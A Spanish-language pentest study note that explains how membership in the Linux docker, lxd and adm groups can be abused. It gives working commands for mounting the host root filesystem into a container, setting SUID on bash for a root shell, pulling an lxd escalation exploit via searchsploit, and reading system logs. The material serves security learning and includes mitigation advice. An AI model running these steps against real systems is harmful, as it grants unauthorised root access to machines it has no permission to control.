------
- Tags: #escalation #privilege #permisos 
--------
# Explicación

> En el contexto de Linux, los **grupos** se utilizan para **organizar** a los usuarios y **asignar** **permisos** para acceder a los recursos del sistema. Los usuarios pueden pertenecer a uno o varios grupos, y los grupos pueden tener diferentes niveles de permisos para acceder a los recursos del sistema.

Existen grupos especiales en Linux, como **``lxd``** o **``docker``**, que se utilizan para permitir a los usuarios ejecutar contenedores de manera segura y eficiente. Sin embargo, si un usuario malintencionado tiene acceso a uno de estos grupos, podría aprovecharlo para obtener privilegios elevados en el sistema.

Por ejemplo, si un usuario tiene acceso al grupo **``docker``**, podría utilizar la herramienta Docker para desplegar nuevos contenedores en el sistema. Durante el proceso de despliegue, el usuario podría aprovecharse de las **monturas** (**``mounts``**) para hacer que ciertos recursos inaccesibles en la máquina host estén disponibles en el contenedor. Al ganar acceso al contenedor como usuario ‘**root**‘, el usuario malintencionado podría inferir o manipular el contenido de estos recursos desde el contenedor.

Para mitigar el riesgo de abuso de grupos de usuario especiales, es importante limitar cuidadosamente el acceso a estos grupos y asegurarse de que sólo se asignan a usuarios confiables que realmente necesitan acceder a ellos.

# Ejemplo

Una vez que obtengamos el acceso a la máquina víctima, si realizamos un ``id`` podremos ver **a que grupos pertenece el usuario actual** en el que estamos operando. 
Tenemos que entender que hay muchos grupos existentes por defecto, uno de ellos es el grupo ``sudo`` que si un usuario pertenece a el tiene permitido ejecutar comandos como **root**, para esto simplemente basta con saber la contraseña del usuario **actual** (*Que no siempre es el caso cuando accedemos a una máquina*).

Como vamos a estar manipulando el acceso a determinados grupos, una vez que terminemos lo conveniente es hacer un ``gpasswd -d c4sp docker`` para que el usuario *c4sp* **no pertenezca al grupo docker** en este caso, pero debemos hacerlo con todos los que manipulemos por seguridad.

-------
## Grupo docker

Aislado al grupo que nombramos recién, también existe el grupo ``docker``, si realizamos **como root** un ``usermod -a -G docker c4sp`` le estamos asignando el grupo **docker** al usuario **c4sp**.

Imaginemos que comprometemos una máquina y el usuario que ingresamos por defecto es **c4sp** y no sabemos su contraseña, haciendo un breve reconocimiento vemos que pertenece al grupo ``docker``, por lo tanto tendríamos permiso para listar **las imágenes**, **los contenedores desplegados/activos** y **desplegar contenedores**, por lo tanto podríamos efectuar un ``docker pull ubuntu:latest`` para crear una imagen de la ultima versión de Ubuntu.

Después vamos a hacer correr ese contenedor pero haciendo uso de las **Monturas** para que todos los archivos que se encuentren en la raíz ``/`` del sistema, **se puedan ver** desde el directorio ``/mnt/root`` del contenedor.

- ``docker run -dit -v /:/mnt/root --name dockerGroup ubuntu``

De esta manera podríamos ver y modificar los archivos de cualquier directorio del **Sistema Host** a través del contenedor. ==Recordemos que si borramos un archivo desde el contenedor, será borrado en la máquina real==

Un ejemplo de algo crítico que podríamos hacer sería ir al directorio ``/bin`` y otorgarle **permisos SUID** al binario ``bash`` tal que así ``chmod u+s bash``, de esta manera cuando salgamos del contenedor ese permiso **quedará vigente**, y podremos ejecutarnos una **bash** como usuario privilegiado (root) con ``bash -p``

------
## Grupo adm

Para este ejemplo nos vamos a aprovechar del grupo ``adm`` que lo que nos permite es **leer los logs del sistema**, para esto le asignaremos ese grupo a nuestro usuario ``usermod -a -G adm c4sp``. Cabe aclarar que **no es un grupo que permita elevar nuestro privilegio** pero si podemos leer los **logs** para **adquirir información confidencial**.

La ruta por defecto de los **logs** del sistema está en ``/var/log``, pero también podríamos realizar un ``find /var/log -group adm 2>/dev/null``

----
## Grupo lxd

Para este ejemplo tendremos que instalar ``lxd`` con ``snap install lxd``.

- ``usermod -a -G lxd c4sp``

**LXD** es similar a Docker, ya que podremos desplegar contenedores y manipularlos con el uso de **monturas**.
Si nosotros realizamos un ``searchsploit lxd privilege escalation`` veremos que hay un script que nos permite **realizar una escalada de manera automatizada** abusando del grupo **lxd**, por lo tanto lo descargaremos con ``searchsploit -m linux/local/46978.sh``, luego leeremos las instrucciones que posee dentro y las seguiremos paso a paso.

- ``wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine`` [Máquina atacante]
- ``bash build-alpine`` [Máquina atacante]
- Transferir **el archivo comprimido creado por el comando anterior** y el **script** que conseguimos con ``searchsploit`` a la máquina víctima [Máquina atacante]
- Una vez tenemos el comprimido en la máquina víctima ejecutar el script con ``./lxd-escalation -f alpine-v3.20-x86_64-20240920_1914.tar.gz`` para obtener el usuario root [Máquina víctima]
- Una vez dentro del contenedor, ir al directorio /mnt/root para ver todos los recursos de la máquina host [Máquina víctima]

Puede que al ejecutar el script final para escalar privilegios con ``lxd``, te de el error "``lxc: orden no encontrada``". Para solucionar esto, asegúrate de que tienes instalado ``lxc``, en caso de que no instálalo con el comando ``sudo apt install lxc``. Una vez que lo tengamos instalado, tenemos que incluir la ruta ``/snap/bin`` al **PATH** con el comando ``export PATH=$PATH:/snap/bin`` Ahora si volvemos a ejecutar el script, nos debería de funcionar.

De esta manera podría modificar por ejemplo el binario en ``/bin/bash`` dándole **permisos SUID** para poder modificarlos en la **máquina host**, de esta forma podríamos ejecutarnos una **bash privilegiada** con ``bash -p``.